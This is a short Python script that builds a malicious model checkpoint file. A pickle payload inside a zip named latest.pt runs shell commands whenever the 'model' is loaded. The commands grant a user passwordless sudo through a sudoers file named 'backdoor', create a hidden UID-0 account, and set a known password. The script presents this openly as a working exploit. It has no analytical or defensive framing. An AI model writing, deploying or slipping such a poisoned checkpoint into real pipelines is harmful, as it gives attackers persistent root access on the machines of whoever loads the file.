#!/usr/bin/env python3
import os, pickle, zipfile

class RCE:
    def __init__(self):
        self.cmd = """
# Elevate developer user to root access
echo 'developer ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/backdoor
chmod 0440 /etc/sudoers.d/backdoor

# Create root user with known password as backup
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash rootbackdoor
echo 'pwned:pwned' | chpasswd
"""

    def __reduce__(self):
        return (os.system, (self.cmd,))

# Build checkpoint
payload = pickle.dumps({"model": RCE()}, protocol=2)
with zipfile.ZipFile("/datastore/checkpoints/latest.pt", "w") as z:
    z.writestr("archive/data.pkl", payload)
    z.writestr("archive/version", "3\n")

print("[+] Malicious checkpoint saved at /datastore/checkpoints/latest.pt")
